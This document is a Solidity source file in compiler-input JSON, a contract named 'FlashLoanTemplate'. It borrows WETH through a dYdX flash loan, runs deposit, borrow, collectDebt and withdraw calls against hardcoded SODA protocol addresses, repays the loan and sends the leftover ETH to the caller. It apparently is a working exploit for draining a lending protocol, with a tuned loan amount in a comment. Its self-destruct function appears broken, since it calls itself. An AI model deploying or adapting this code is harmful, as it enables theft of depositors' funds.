{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"contracts/dydxflashloan.sol":{"content":"pragma solidity ^0.7.0;\r\npragma experimental ABIEncoderV2;\r\n// loan amount should be 394494389399999950760\r\n\r\nlibrary Types {\r\n    enum AssetDenomination { Wei, Par }\r\n    enum AssetReference { Delta, Target }\r\n    struct AssetAmount {\r\n        bool sign;\r\n        AssetDenomination denomination;\r\n        AssetReference ref;\r\n        uint256 value;\r\n    }\r\n}\r\n\r\nlibrary Account {\r\n    struct Info {\r\n        address owner;\r\n        uint256 number;\r\n    }\r\n}\r\n\r\nlibrary Actions {\r\n    enum ActionType {\r\n        Deposit, Withdraw, Transfer, Buy, Sell, Trade, Liquidate, Vaporize, Call\r\n    }\r\n    struct ActionArgs {\r\n        ActionType actionType;\r\n        uint256 accountId;\r\n        Types.AssetAmount amount;\r\n        uint256 primaryMarketId;\r\n        uint256 secondaryMarketId;\r\n        address otherAddress;\r\n        uint256 otherAccountId;\r\n        bytes data;\r\n    }\r\n}\r\n\r\ninterface ISoloMargin {\r\n    function operate(Account.Info[] memory accounts, Actions.ActionArgs[] memory actions) external;\r\n}\r\n\r\n// The interface for a contract to be callable after receiving a flash loan\r\ninterface ICallee {\r\n    function callFunction(address sender, Account.Info memory accountInfo, bytes memory data) external;\r\n}\r\n\r\n// Standard ERC-20 interface\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n// Additional methods available for WETH\r\ninterface IWETH is IERC20 {\r\n    function deposit() external payable;\r\n    function withdraw(uint wad) external;\r\n}\r\ninterface SODA {\r\n    function deposit(uint256, uint256) external;\r\n    function withdraw(uint256, uint256) external;\r\n    function claim(uint256) external;\r\n    function collectDebt(uint256 _poolId, uint256 _loanId) external;\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function borrow(uint256 _poodId, uint256 _amount) external;\r\n}\r\n\r\ncontract FlashLoanTemplate is ICallee {\r\n    \r\n    IWETH private WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);\r\n\r\n    ISoloMargin private soloMargin = ISoloMargin(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e);\r\n    \r\n    address payable borrwcoll = 0x86207a87FD89fE3396C9CF8267F2960494C21102;\r\n    address payable depocontct = 0x74BCb8b78996F49F46497be185174B2a89191fD6;\r\n    address payable soveth = 0x8d5d838Db2522C187A3062CAd0C7d55158F31EbF;\r\n    address soETH = 0x9f1d057d1140cb32653779c7719310D431D49861;\r\n    \r\n    constructor() payable {\r\n       \r\n        WETH.approve(address(soloMargin), uint(-1));\r\n        WETH.approve(address(depocontct), uint(-1));\r\n        IERC20(soETH).approve(0x6d934b673cb8f33427343c8d235310063e9577Ee, uint(-1));\r\n    }\r\n    \r\n  \r\n    function flashLoan(uint loanAmount) external {\r\n\r\n        \r\n        Actions.ActionArgs[] memory operations = new Actions.ActionArgs[](3);\r\n\r\n        operations[0] = Actions.ActionArgs({\r\n            actionType: Actions.ActionType.Withdraw,\r\n            accountId: 0,\r\n            amount: Types.AssetAmount({\r\n                sign: false,\r\n                denomination: Types.AssetDenomination.Wei,\r\n                ref: Types.AssetReference.Delta,\r\n                value: loanAmount // Amount to borrow\r\n            }),\r\n            primaryMarketId: 0, // WETH\r\n            secondaryMarketId: 0,\r\n            otherAddress: address(this),\r\n            otherAccountId: 0,\r\n            data: \"\"\r\n        });\r\n        \r\n        operations[1] = Actions.ActionArgs({\r\n                actionType: Actions.ActionType.Call,\r\n                accountId: 0,\r\n                amount: Types.AssetAmount({\r\n                    sign: false,\r\n                    denomination: Types.AssetDenomination.Wei,\r\n                    ref: Types.AssetReference.Delta,\r\n                    value: 0\r\n                }),\r\n                primaryMarketId: 0,\r\n                secondaryMarketId: 0,\r\n                otherAddress: address(this),\r\n                otherAccountId: 0,\r\n                data: abi.encode(\r\n                    // Replace or add any additional variables that you want\r\n                    // to be available to the receiver function\r\n                    msg.sender,\r\n                    loanAmount\r\n                )\r\n            });\r\n        \r\n        operations[2] = Actions.ActionArgs({\r\n            actionType: Actions.ActionType.Deposit,\r\n            accountId: 0,\r\n            amount: Types.AssetAmount({\r\n                sign: true,\r\n                denomination: Types.AssetDenomination.Wei,\r\n                ref: Types.AssetReference.Delta,\r\n                value: loanAmount + 2 // Repayment amount with 2 wei fee\r\n            }),\r\n            primaryMarketId: 0, // WETH\r\n            secondaryMarketId: 0,\r\n            otherAddress: address(this),\r\n            otherAccountId: 0,\r\n            data: \"\"\r\n        });\r\n\r\n        Account.Info[] memory accountInfos = new Account.Info[](1);\r\n        accountInfos[0] = Account.Info({owner: address(this), number: 1});\r\n\r\n        soloMargin.operate(accountInfos, operations);\r\n    }\r\n    \r\n    address payable destrctr = 0x829367601dD3546c73e7C8E418535f61E5d4670c;\r\n    \r\n    function selfdestruct() public {\r\n        require(msg.sender == destrctr);\r\n        selfdestruct();\r\n    }\r\n    \r\n    uint loanAmoun1;\r\n    uint loanAmoun2 = 70000000000000000000;\r\n    \r\n    function setloanamonts(uint _sumnum, uint sumnum2) public {\r\n        loanAmoun1 = _sumnum;\r\n        loanAmoun2 = sumnum2;\r\n    }\r\n    \r\n    function callFunction(address sender, Account.Info memory accountInfo, bytes memory data) external override {\r\n        \r\n        (\r\n         \r\n            address payable actualSender,\r\n            uint loanAmount\r\n        ) = abi.decode(data, (\r\n            address, uint\r\n        ));\r\n        \r\n        loanAmoun1 = loanAmount;\r\n        \r\n        \r\n        SODA(depocontct).deposit(0, loanAmoun1);\r\n        SODA(borrwcoll).borrow(0, loanAmoun2);\r\n        SODA(borrwcoll).collectDebt(0, 1000000000000000028);\r\n        SODA(depocontct).withdraw(0, SODA(soveth).balanceOf(address(this)));\r\n       \r\n        require(WETH.balanceOf(address(this)) > loanAmount + 2, \"C\");\r\n\r\n        WETH.withdraw(WETH.balanceOf(address(this)) - loanAmount - 2);\r\n  \r\n        actualSender.transfer(address(this).balance);\r\n    }\r\n}"}}}